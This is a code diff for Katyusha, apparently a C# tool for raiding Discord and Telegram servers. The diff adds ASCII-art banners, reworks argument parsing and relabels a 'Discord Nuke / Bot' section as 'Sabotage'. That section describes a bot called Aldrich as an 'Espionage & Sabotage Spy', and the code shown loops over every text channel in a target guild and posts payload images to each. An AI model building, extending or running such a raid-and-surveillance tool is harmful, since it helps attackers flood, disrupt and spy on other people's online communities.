@@ -1,4 +1,34 @@
 ﻿// 
+//                                                .                                
+//                                             .^~~~^:.                            
+//                                         .^~~~!!!!!!~~^^.
+//                                     .:^~~!!7!!!!!!!!!!!!~~^:..
+//                                  .:~!~~!7!!77!!7!7!!!!!!!!77!~
+//                              .:^~!!~~!!!77!!!~~!!!!?77!777!^:.                  
+//                          .:^~~~!!?!!777!!~~!!~~777?77!!~^.
+//                       .:^!!!!!!!7!77!~!~!7!~777??J777!~^:.                      
+//                   .:^~~~~~~!!777!!!~!~!~7?7?777!7?77???JJJ?7~^.
+//             :^:::^~!~~~~!!7!!!7!!777!!77??7!!~:.~7!!!!77????J?!^^^^^:..
+//         .^7Y55YJ?!!~~!!!!!!~~~~!~7777???!7^.   .!7!!!!!!!?JJ????7JYYYYJ?!^.
+//      :!J555Y5YYJJYJ??~~~!!!~!!!77?????7^.^     .!!!!!!!!!?Y?????J?JJJJJJ???^:
+//  :!!?YP55YYJJYYYYYYJJJ7?7~777???77?!!~~~^:     .!!777?!!!?YJJYYYYJ?J?????7?7!^
+//  .~777!J?JYYYYJJJJY5YYYY55J77!!7~:::..!?7::^^^^^~7JJ??!~!7YYPPPP5JJJJJJJJ?7?!^
+//   .^^~!7777J?JYY5YYJY5PPY?7?7!!!~~^^:!77!77!~~!~~!7??J!^!7J5GP55YJ7??~^~7??!:^.
+//     .:^^~~!!77?YJY5P5J?JY5Y?!77!!!!~~~~!~!~~~^^^^7JYYYJ!~?Y5YYYJJ?7?!.!Y5YYY7
+//       ..:^~~~!7!?5JJJJYYJ?77??!!~!~~^^^^~^..!7^^?5Y?7!JY!JYJJJJJJJ?7^!55JYYY?
+//          ...:^~~~!Y5J?~~~77?!~~^^^^~~^^~7777??!!JY7777Y!.:!?7!~^:..  ^Y5JJYJ:
+//              .:^!77~:^~^~~~~^~!!77??JJJYYYYYYJ??JYJJJJ^               :!7!^
+//                .~~~~^^:^~~~!??JJJJJJJ??7!?JJJYJ!!Y~:.                           
+//                   .~!777!7???JJYYJJJ?^^^J5?J!!5J :.
+//                     ::.:7???JYYJ??!?57^!5Y77?Y5^
+//                         .^!?YJY777!JY: :!JYYJ7:                                 
+//                            .^7YYYJY?:     ..
+//                               :~~^.
+// 
+//                          \\ █▄▀ ▄▀█ ▀█▀ █▄█ █ █ █▀ █ █ ▄▀█ //
+//                          // █ █ █▀█  █   █  █▄█ ▄█ █▀█ █▀█ \\
+//                             GenesisFoundationCore / Katyusha
+// 
 //       ▄▀█ █▀▀ █▀▀ █▀▀ █▀ █▀ █ █▄░█ █▀▀   ▀█▀ █░█ █ █▀   █▀▀ █ █░░ █▀▀   █▄█ █▀█ █░█   ▄▀█ █▀█ █▀▀
 //       █▀█ █▄▄ █▄▄ ██▄ ▄█ ▄█ █ █░▀█ █▄█   ░█░ █▀█ █ ▄█   █▀░ █ █▄▄ ██▄   ░█░ █▄█ █▄█   █▀█ █▀▄ ██▄
 // 
@@ -113,7 +143,6 @@ namespace Katyusha
                 return;
             }
             folderPath = args[0];
-            string mode = args[1].ToLower();
             clienttype = args[2].ToLower();
             token = args[3].ToLower();
 
@@ -164,10 +193,10 @@ namespace Katyusha
                         TextMode();
                         break;
                     case "fragment":
-                        FragmentMode(Int32.Parse(mode));
+                        FragmentMode(Int32.Parse(args[1].ToLower()));
                         break;
                     case "bm-21":
-                        FragmentMode(Int32.Parse(mode));
+                        FragmentMode(Int32.Parse(args[1].ToLower()));
                         break;
                 }
             }
@@ -187,7 +216,7 @@ namespace Katyusha
                 return;
             }
 
-            MainLoop(mode, imageFiles);
+            MainLoop(args[1].ToLower(), imageFiles);
             Features(args);
         }
 
@@ -536,15 +565,15 @@ namespace Katyusha
                                     [ Your Local/Current IP, This needs to use your Public IP  ]
                                     [ to work.                                                 ] 
                                
-      Discord Nuke / Bot:
+      Sabotage:
         
         Aldrich                     : A Discord Bot that is a Espionage & Sabotage Spy that
         [directory] [mode] [options]  can be controlled locally without the use of commands
         (c:\dir..) aldrich -d         in the Discord Server.
         (c:\dir..) aldrich -t         
         
-        -d / --discord / -dd        : Uses Discord Nuke Bot
-        -t / --telegram / -tm       : Uses Telegram Nuke Bot
+        -d / --discord / -dd        : Uses Discord Bot
+        -t / --telegram / -tm       : Uses Telegram Bot
 
     Features:                       
                                     
@@ -808,7 +837,7 @@ namespace Katyusha
             {
                 botmode = 1;
                 dbot = new DiscordSocketClient();
-                var guild = dbot.GetGuild(ulong.Parse(token)); // Replace with your guild ID
+                var guild = dbot.GetGuild(ulong.Parse(token));
                 foreach (var channel in guild.TextChannels)
                 {
                     await SendImages_KatyushaInternal(channel, payloads, null);
@@ -926,4 +955,35 @@ namespace Katyusha
 // 
 // █▄░█ █▀█ █▄░█ █▀▀ █▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀█ █▀▀ █ ▄▀█ █░░   █▀█ █░█ █▀█ █▀█ █▀█ █▀ █▀▀ █▀   █▀█ █▄░█ █░░ █▄█ ░
 // █░▀█ █▄█ █░▀█ █▄▄ █▄█ █░▀░█ █░▀░█ ██▄ █▀▄ █▄▄ █ █▀█ █▄▄   █▀▀ █▄█ █▀▄ █▀▀ █▄█ ▄█ ██▄ ▄█   █▄█ █░▀█ █▄▄ ░█░ ▄
+// 
+// 
+//                                                .                                
+//                                             .^~~~^:.                            
+//                                         .^~~~!!!!!!~~^^.
+//                                     .:^~~!!7!!!!!!!!!!!!~~^:..
+//                                  .:~!~~!7!!77!!7!7!!!!!!!!77!~
+//                              .:^~!!~~!!!77!!!~~!!!!?77!777!^:.                  
+//                          .:^~~~!!?!!777!!~~!!~~777?77!!~^.
+//                       .:^!!!!!!!7!77!~!~!7!~777??J777!~^:.                      
+//                   .:^~~~~~~!!777!!!~!~!~7?7?777!7?77???JJJ?7~^.
+//             :^:::^~!~~~~!!7!!!7!!777!!77??7!!~:.~7!!!!77????J?!^^^^^:..
+//         .^7Y55YJ?!!~~!!!!!!~~~~!~7777???!7^.   .!7!!!!!!!?JJ????7JYYYYJ?!^.
+//      :!J555Y5YYJJYJ??~~~!!!~!!!77?????7^.^     .!!!!!!!!!?Y?????J?JJJJJJ???^:
+//  :!!?YP55YYJJYYYYYYJJJ7?7~777???77?!!~~~^:     .!!777?!!!?YJJYYYYJ?J?????7?7!^
+//  .~777!J?JYYYYJJJJY5YYYY55J77!!7~:::..!?7::^^^^^~7JJ??!~!7YYPPPP5JJJJJJJJ?7?!^
+//   .^^~!7777J?JYY5YYJY5PPY?7?7!!!~~^^:!77!77!~~!~~!7??J!^!7J5GP55YJ7??~^~7??!:^.
+//     .:^^~~!!77?YJY5P5J?JY5Y?!77!!!!~~~~!~!~~~^^^^7JYYYJ!~?Y5YYYJJ?7?!.!Y5YYY7
+//       ..:^~~~!7!?5JJJJYYJ?77??!!~!~~^^^^~^..!7^^?5Y?7!JY!JYJJJJJJJ?7^!55JYYY?
+//          ...:^~~~!Y5J?~~~77?!~~^^^^~~^^~7777??!!JY7777Y!.:!?7!~^:..  ^Y5JJYJ:
+//              .:^!77~:^~^~~~~^~!!77??JJJYYYYYYJ??JYJJJJ^               :!7!^
+//                .~~~~^^:^~~~!??JJJJJJJ??7!?JJJYJ!!Y~:.                           
+//                   .~!777!7???JJYYJJJ?^^^J5?J!!5J :.
+//                     ::.:7???JYYJ??!?57^!5Y77?Y5^
+//                         .^!?YJY777!JY: :!JYYJ7:                                 
+//                            .^7YYYJY?:     ..
+//                               :~~^.
+// 
+//                          \\ █▄▀ ▄▀█ ▀█▀ █▄█ █ █ █▀ █ █ ▄▀█ //
+//                          // █ █ █▀█  █   █  █▄█ ▄█ █▀█ █▀█ \\
+//                             GenesisFoundationCore / Katyusha
 // 
